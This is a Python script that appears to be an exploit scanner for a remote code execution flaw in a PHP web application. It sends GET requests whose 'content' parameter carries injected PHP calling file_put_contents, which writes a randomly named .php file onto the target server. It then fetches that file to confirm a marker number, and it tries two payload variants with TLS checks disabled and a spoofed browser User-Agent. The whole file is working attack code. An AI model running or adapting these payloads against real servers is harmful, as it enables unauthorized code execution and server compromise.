import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r=randomLowercase(7)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
r11=randomInt(1000000000, 2000000000)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	try:
		url=baseurl+'index.php?a=fetch&content=%3C?php+file_put_contents(%22'+str(r)+'.php%22,%22%3C?php+echo("'+str(r11)+'")%3B%22)%3B'
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if True:
			r0=True
		else:
			r0=False
		url=baseurl+""+str(r)+".php"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and str(r11) in response.text:
			r1=True
		else:
			r1=False
		if r0 and r1:
			s1=True
		else:
			s1=False
	except:
		s1=False
	try:
		url=baseurl+'?a=fetch&templateFile=public/index&prefix=%27%27&content=%3Cphp%3Efile_put_contents(%27'+str(r)+'.php%27,%27%3C?php%20echo("'+str(r11)+'");%20?%3E%27)%3C/php%3E'
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if True:
			r2=True
		else:
			r2=False
		url=baseurl+""+str(r)+".php"
		headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
		response=requests.get(url,headers=headers,timeout=5,verify=False)
		if response.status_code == 200 and str(r11) in response.text:
			r3=True
		else:
			r3=False
		if r2 and r3:
			s2=True	
		else:
			s2=False
	except:
		s2=False
	if s1 or s2:
		return True
	else:
		return False
